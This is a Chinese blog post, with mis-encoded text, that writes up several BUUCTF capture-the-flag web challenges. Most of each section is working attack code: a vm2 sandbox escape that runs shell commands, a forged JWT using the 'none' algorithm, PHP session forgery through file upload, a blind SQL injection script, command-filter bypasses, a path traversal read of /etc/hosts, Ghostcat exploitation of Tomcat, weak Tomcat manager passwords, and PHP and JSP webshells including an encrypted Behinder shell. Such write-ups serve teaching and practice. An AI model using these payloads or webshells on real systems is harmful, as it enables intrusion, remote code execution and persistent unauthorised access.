<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>BUUCTF-2 | Tyaoo's Blog</title><meta name="keywords" content="CTF"><meta name="author" content="Tyaoo"><meta name="copyright" content="Tyaoo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="è¡¥ä¸€ä¸‹æœ€è¿‘çš„ BUUCTF åšé¢˜è®°å½•">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUCTF-2">
<meta property="og:url" content="https://tyaoo.github.io/2020/05/26/BUUCTF-2/index.html">
<meta property="og:site_name" content="Tyaoo&#39;s Blog">
<meta property="og:description" content="è¡¥ä¸€ä¸‹æœ€è¿‘çš„ BUUCTF åšé¢˜è®°å½•">
<meta property="og:locale">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2020-05-26T12:15:45.000Z">
<meta property="article:modified_time" content="2020-05-27T14:12:37.848Z">
<meta property="article:author" content="Tyaoo">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2020/05/26/BUUCTF-2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'BUUCTF-2',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2020-05-27 22:12:37'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF-2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-05-26T12:15:45.000Z" title="Created 2020-05-26 20:15:45">2020-05-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-05-27T14:12:37.848Z" title="Updated 2020-05-27 22:12:37">2020-05-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BUUCTF-2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p> è¡¥ä¸€ä¸‹æœ€è¿‘çš„ BUUCTF åšé¢˜è®°å½•</p>
<span id="more"></span>

<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p><strong>Node.js</strong></p>
<p>åˆ©ç”¨æŠ¥é”™å¯ä»¥å¾—çŸ¥å‰ç«¯ php ï¼Œåç«¯æ˜¯ vm2</p>
<pre><code>(function()&#123;
var err = new Error();
return err.stack;
&#125;)();</code></pre><p>å» github æœç´¢ vm2 çš„æ¼æ´æ‰¾åˆ°ä»¥ä¸‹çš„ payload</p>
<p><a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p>
<pre><code>(function()&#123;
    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
    try&#123;
        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
    &#125;catch(e)&#123;
        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();
    &#125;
&#125;)()</code></pre><p>ä½†æ˜¯ waf å¾ˆå¤šå­—ç¬¦ï¼Œå‘ç°å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œæ‰€ä»¥æœ€ç»ˆ payload æ˜¯</p>
<pre><code>/run.php?code[]=(function()&#123; TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123; return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString(); &#125; &#125;)()</code></pre><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p><strong>JWT</strong></p>
<p>æŸ¥çœ‹ app.js å‘ç°æ˜¯ koa æ¡†æ¶ï¼Œæ ¹æ®æ¡†æ¶æœåˆ°æºç åœ¨ controllers/api.js</p>
<pre><code>const crypto = require(&#39;crypto&#39;);
const fs = require(&#39;fs&#39;)
const jwt = require(&#39;jsonwebtoken&#39;)

const APIError = require(&#39;../rest&#39;).APIError;

module.exports = &#123;
    &#39;POST /api/register&#39;: async (ctx, next) =&gt; &#123;
        const &#123;username, password&#125; = ctx.request.body;

        if(!username || username === &#39;admin&#39;)&#123;
            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
        &#125;

        if(global.secrets.length &gt; 100000) &#123;
            global.secrets = [];
        &#125;

        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);

        ctx.rest(&#123;
            token: token
        &#125;);

        await next();
    &#125;,

    &#39;POST /api/login&#39;: async (ctx, next) =&gt; &#123;
        const &#123;username, password&#125; = ctx.request.body;

        if(!username || !password) &#123;
            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
        &#125;

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        &#125;

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);

        const status = username === user.username &amp;&amp; password === user.password;

        if(status) &#123;
            ctx.session.username = username;
        &#125;

        ctx.rest(&#123;
            status
        &#125;);

        await next();
    &#125;,

    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; &#123;
        if(ctx.session.username !== &#39;admin&#39;)&#123;
            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
        &#125;

        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
        ctx.rest(&#123;
            flag
        &#125;);

        await next();
    &#125;,

    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; &#123;
        ctx.session.username = null;
        ctx.rest(&#123;
            status: true
        &#125;)
        await next();
    &#125;
&#125;;</code></pre><p>è¿™é‡Œå¯ä»¥é€šè¿‡è®¾ç½®secretidä¸ºæ•°ç»„ï¼ŒåŠ å¯†ç®—æ³•ä¸ºç©ºç»•è¿‡ç™»é™†éªŒè¯ï¼Œpayload</p>
<pre><code>import jwt
print(jwt.encode(&#123;&quot;secretid&quot;:[],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123456&quot;,&quot;iat&quot;: 158763206&#125;, &#39;&#39;, algorithm=&#39;none&#39;))

#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU4NzYzMjA2fQ.</code></pre><p>ç„¶åç›´æ¥è®¿é—® /api/flag å°±è¡Œäº†</p>
<h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><p><strong>æ–‡ä»¶ä¸Šä¼ </strong></p>
<p>è¦æƒ³æ‹¿åˆ° flag éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶</p>
<pre><code>if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
&#123;
    $filename=&#39;/var/babyctf/success.txt&#39;;
    if(file_exists($filename))&#123;
            safe_delete($filename);
            die($flag);
    &#125;
&#125;</code></pre><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¼ªé€  admin ç„¶åå†åˆ›å»ºä¸€ä¸ª success.txt æ–‡ä»¶</p>
<p>çœ‹çœ‹ä»£ç é€»è¾‘ï¼Œsess æ–‡ä»¶å­˜å‚¨åœ¨æ ¹ç›®å½•ï¼Œä»¤ attr=. å°±å¯ä»¥è¯»å–å½“å‰ç›®å½•ï¼Œæ–‡ä»¶ååˆ™ä¸º sess_PHPSESSIDï¼Œåˆšå¥½æ–‡ä»¶çš„å‘½åæ–¹å¼ä¸º â€˜æ–‡ä»¶åâ€™ + â€˜_â€™ + â€˜æ–‡ä»¶å†…å®¹å“ˆå¸Œå€¼â€™ï¼Œæ‰€ä»¥æ»¡è¶³ä¼ªé€  admin çš„æ¡ä»¶ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆè¯»ä¸€ä¸‹ sess æ–‡ä»¶æ˜¯ç”¨ä»€ä¹ˆå­˜å‚¨å¼•æ“çš„</p>
<pre><code>import requests as rq

url = &quot;http://91291e0d-960a-4f9c-91e0-c6f251ca14e1.node3.buuoj.cn/&quot;
data = &#123;&quot;filename&quot;:&quot;sess_c82aa666b4f44ff16a6e88bdd1fb6d1d&quot;,&quot;attr&quot;:&quot;.&quot;,&quot;direction&quot;:&quot;download&quot;&#125;
res = rq.post(url, data=data)
print(res.text)</code></pre><p>è¿”å› sess æ–‡ä»¶çš„å†…å®¹æ˜¯</p>
<pre><code>usernames:5:&quot;guest&quot;;</code></pre><p>å¯ä»¥æ¨æµ‹èµ·é‡‡ç”¨çš„å­˜å‚¨å¼•æ“æ˜¯<code>php_binary</code>ï¼Œæœ¬åœ°è‡ªå·±ç”Ÿæˆä¸€ä¸ª sess æ–‡ä»¶</p>
<pre><code>&lt;?php
    ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);
    session_start();
    $_SESSION[&#39;name&#39;] = &#39;admin&#39;;
?&gt;</code></pre><p>æ‰“å¼€è‡ªå·±çš„ php.ini çœ‹çœ‹ session.save_path åœ¨å“ªé‡Œï¼Œç”¨åå…­è¿›åˆ¶æ‰“å¼€æ–‡ä»¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ° username å‰é¢å…¶å®è¿˜æœ‰ä¸€ä¸ªä¸å¯è§å­—ç¬¦<code>0x08</code>ï¼Œå®ƒè¡¨ç¤ºçš„æ˜¯ username çš„é•¿åº¦ï¼Œæ‰€ä»¥åœ¨ä¼ æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„è¿™ä¸ªä¸å¯è§å­—ç¬¦</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527110924.png" alt="image-20200518180309624"></p>
<p>æ‰€ä»¥ä¸Šä¼  sess æ–‡ä»¶ï¼Œæ‰€ä»¥æ–‡ä»¶å</p>
<pre><code>import requests as rq
import hashlib

url = &quot;http://91291e0d-960a-4f9c-91e0-c6f251ca14e1.node3.buuoj.cn/&quot;
files = &#123;&quot;up_file&quot;: (&quot;sess&quot;, &#39;\x08usernames:5:&quot;admin&quot;;&#39;)&#125;
data = &#123;&quot;attr&quot;:&quot;.&quot;,&quot;direction&quot;:&quot;upload&quot;&#125;
res = rq.post(url, data=data, files=files)
print(res.text)
PHPSSID = hashlib.sha256(b&#39;\x08usernames:5:&quot;admin&quot;;&#39;).hexdigest()
print(f&#39;filename: sess_&#123;PHPSSID&#125;&#39;)</code></pre><p><code>file_exists</code>å¯ä»¥åˆ¤æ–­æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥è¿™é‡ŒæŠŠ attr æ”¹æˆ success.txt å³å¯</p>
<pre><code>import requests as rq

files = &#123;&quot;up_file&quot;: (&quot;kk&quot;, &#39;hack&#39;)&#125;
data = &#123;&quot;attr&quot;:&quot;success.txt&quot;,&quot;direction&quot;:&quot;upload&quot;&#125;
res = rq.post(url, data=data, files=files)
print(res.text)</code></pre><p>å¸¦ä¸Š admin çš„ cookie å°±å¯ä»¥çœ‹åˆ° flag äº†</p>
<h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p><strong>å¼‚æˆ–ç›²æ³¨</strong></p>
<p>æœ‰ä¸€ä¸ªæŸ¥è¯¢æ¥å£ï¼Œç®€å•æµ‹è¯•å¯ä»¥å‘ç°</p>
<pre><code>?stunum=1^1^1 =&gt; Hi admin, your score is: 100
?stunum=1^0^1 =&gt; student number not exists.</code></pre><p>æ‰€ä»¥æ˜¯å¸ƒå°”ç›²æ³¨ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œç¥­å‡ºè€è„šæœ¬</p>
<pre><code>from multiprocessing import Pool, Manager
import requests, time

def func(index, results):

    l = 0
    r = 127
    m = (l+r)//2

    while l&lt;r:
        url = &#39;http://c890296e-d508-471e-b89c-1dc73859c8a4.node3.buuoj.cn&#39;
        payload = f&quot;1^(ascii(mid((select/**/value/**/from/**/flag),&#123;index + 1&#125;,1))&gt;&#123;m&#125;)^1&quot;
        time.sleep(0.5)
        paramsGet = &#123;&quot;stunum&quot;:payload&#125;
        res = requests.get(url, params=paramsGet)
        if &#39;admin&#39; in res.text:
            l = m + 1
        else:
            r = m
        m = (l + r) // 2
    print(index + 1, m)
    results[index] = m


if __name__ == &quot;__main__&quot;:
    num = 5
    data_num = 50
    data = range(data_num)
    pool = Pool(processes=num)
    manager = Manager()
    results = manager.list([0]*data_num)
    jobs = []
    for d in data:
        job = pool.apply_async(func, (d, results))
        jobs.append(job)
    pool.close()
    pool.join()
    print(results)
    results = &#39;&#39;.join([chr(_) for _ in results])
    print(results)</code></pre><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p><strong>ä»£ç å®¡è®¡</strong></p>
<p>robots.txt ä¿¡æ¯æ³„éœ²</p>
<pre><code>User-agent: *
Disallow: /fAke_f1agggg.php</code></pre><p>è®¿é—®ä¸€ä¸‹å“åº”å¤´æœ‰ä¸œè¥¿</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111232.png" alt="image-20200526171751316"></p>
<p>ç„¶åæ˜¯ä¸ªä»£ç å®¡è®¡</p>
<pre><code>&lt;?php
header(&#39;Content-type:text/html;charset=utf-8&#39;);
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET[&#39;num&#39;]))&#123;
    $num = $_GET[&#39;num&#39;];
    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;
        echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;;
    &#125;else&#123;
        die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;);
    &#125;
&#125;else&#123;
    die(&quot;å»éæ´²å§&quot;);
&#125;
//level 2
if (isset($_GET[&#39;md5&#39;]))&#123;
   $md5=$_GET[&#39;md5&#39;];
   if ($md5==md5($md5))
       echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;;
   else
       die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;);
&#125;else&#123;
    die(&quot;å»éæ´²å§&quot;);
&#125;

//get flag
if (isset($_GET[&#39;get_flag&#39;]))&#123;
    $get_flag = $_GET[&#39;get_flag&#39;];
    if(!strstr($get_flag,&quot; &quot;))&#123;
        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);
        echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;;
        system($get_flag);
    &#125;else&#123;
        die(&quot;å¿«åˆ°éæ´²äº†&quot;);
    &#125;
&#125;else&#123;
    die(&quot;å»éæ´²å§&quot;);
&#125;
?&gt;</code></pre><p>ç¬¬ä¸€å±‚å¯ä»¥åˆ©ç”¨åå…­è¿›åˆ¶ç»•è¿‡ <code>intval</code> ï¼Œintval(str)ä¸º0ï¼Œä½†æ˜¯intval(str+1) ä¼šè‡ªåŠ¨è½¬æ¢æˆæ•°å€¼</p>
<blockquote>
<p>php7é‡Œé¢ä¿®å¤äº†è¿™ä¸ªæ¼æ´</p>
</blockquote>
<pre><code>num=0x1234</code></pre><p>ç¬¬äºŒå±‚ md5 åŒå“ˆå¸Œä¸º 0e ç»•è¿‡ï¼Œæ£€ç´¢ä¸€ä¸‹å°±æœ‰äº†</p>
<p><a target="_blank" rel="noopener" href="http://wh4lter.icu/2017/10/15/php_MD5/">http://wh4lter.icu/2017/10/15/php_MD5/</a></p>
<p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥é‡‡ç”¨è„šæœ¬çˆ†ç ´ï¼ˆä¸æ¨èï¼Œååˆ†æ¼«é•¿ï¼‰</p>
<pre><code>import hashlib, vthread

@vthread.pool(100)
def find(v):
    v = (&#39;0e&#39; + str(v)).encode()
    vv = hashlib.md5(v).hexdigest()
    if vv[:2] == &#39;0e&#39; and vv[2:].isdigit():
        print(&#39;[+] find&#39;, v, vv)

for i in range(int(1e8), int(1e10)):
    find(i)</code></pre><p>éšä¾¿æ‹¿ä¸€ä¸ª</p>
<pre><code>md5=0e00275209979</code></pre><p>ç¬¬ä¸‰å±‚ç©ºæ ¼ç”¨ <code>$&#123;IFS&#125;</code>ï¼Œå‘½ä»¤ç›´æ¥ç”¨æ–œæ ç»•è¿‡</p>
<pre><code>get_flag=ca\t$&#123;IFS&#125;fll*</code></pre><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p><strong>æ–‡ä»¶ä¸Šä¼ </strong></p>
<p>è¯¶ æ³¨å†Œç™»å½•éšä¾¿ä¼ ä¸ªé©¬å°± getshell äº†</p>
<pre><code>&lt;script language=&#39;php&#39;&gt;@eval($_REQUEST[&#39;1&#39;]);&lt;/script&gt;</code></pre><p>è¿ä¸Šå» ?1=system(â€˜cat /*â€™); å°±è¡Œäº†</p>
<h2 id="WUSTCTF2020-easyweb"><a href="#WUSTCTF2020-easyweb" class="headerlink" title="[WUSTCTF2020]easyweb"></a>[WUSTCTF2020]easyweb</h2><p><strong>å¹½çµçŒ«æ¼æ´</strong></p>
<p>éšæ„ä¸Šä¼ æ–‡ä»¶å°±å¯ä»¥è¿›è¡Œä¸‹è½½ï¼Œå¾—åˆ°ä»»æ„è¯»æ–‡ä»¶æ¥å£</p>
<pre><code>/download?file=</code></pre><p>æŠ¥é”™å¾—å‡ºäº†è·¯å¾„</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111428.png" alt="image-20200522213124031"></p>
<p>ä½†æ˜¯ uploads ç›®å½•å¹¶ä¸èƒ½è®¿é—®</p>
<p>æŸ¥çœ‹ web.xml å‘ç°ä½¿ç”¨äº† tomcat.ajp åè®®</p>
<p> <img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111434.png" alt="image-20200522213604609"></p>
<p>è”æƒ³åˆ°ç”¨å¹½çµçŒ«æ¼æ´è¿›è¡Œæ–‡ä»¶åŒ…å«ä»è€Œæ‰§è¡Œå‘½ä»¤</p>
<p><a target="_blank" rel="noopener" href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p>
<p>å…ˆè·å–é¶æœºçš„å†…ç½‘åœ°å€</p>
<pre><code>/download?file=../../../../../../../etc/hosts</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111438.png" alt="image-20200522212808809"></p>
<p>ä¸Šä¼ å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„ js æ–‡ä»¶</p>
<pre><code>&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;
&lt;% 
out.println(&quot;Executing command&quot;);
Process p = Runtime.getRuntime().exec(&quot;ls /&quot;);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) &#123;
  out.println(disr); 
  disr = dis.readLine(); 
&#125;
%&gt;</code></pre><p>å¼€ä¸€ä¸ª Linux Labs è¿è¡Œ ajpShooter.py æ‰§è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<pre><code>python3 ajpShooter.py http://174.1.115.127 8009 /WEB-INF/uploads/fe845d95-805e-4fb7-aac3-7bc
ca4c935ba.jsp eval</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111442.png" alt="image-20200522212736292"></p>
<p>åé¢ç›´æ¥ cat /flag* å°±å¥½äº†</p>
<h2 id="WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="[WUSTCTF2020]Train Yourself To Be Godly"></a>[WUSTCTF2020]Train Yourself To Be Godly</h2><p><strong>tomcat</strong></p>
<blockquote>
<p>å‚è€ƒ <a target="_blank" rel="noopener" href="https://imagin.vip/?p=1323">https://imagin.vip/?p=1323</a> æ–‡ç« </p>
</blockquote>
<p>æ‰“å¼€æ˜¯ä¸€ä¸ª tomcat ç•Œé¢ï¼ŒæŠ¥é”™ç°åœ¨å½“å‰ç›®å½•åœ¨ examples</p>
<p>åˆ©ç”¨ Nginx å’Œ Tomcat å¯¹æŸäº›æ ‡ç‚¹è§£æçš„å·®å¼‚æ€§è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œè¿›å…¥åå°é¡µé¢</p>
<pre><code>http://dcf11651-b9f9-4e12-80ed-038dbf7c34fb.node3.buuoj.cn/..;/manager/html</code></pre><p>åå°é»˜è®¤å¯†ç æ˜¯  tomcat / manager</p>
<p>è¿™é‡Œæ˜¯åˆ©ç”¨å¼±å£ä»¤  tomcat / tomcat</p>
<p>åé¢å°±æ˜¯ç†Ÿæ‚‰çš„ war ä¸Šä¼  webshell äº†</p>
<p>ä¸Šä¸€ä¸ªå†°èçš„ shell</p>
<pre><code>&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;</code></pre><p>ç”Ÿæˆ war åŒ…</p>
<blockquote>
<p>æˆ–è€…æ‰“åŒ…æˆ zip ç„¶åæ”¹æˆ war</p>
</blockquote>
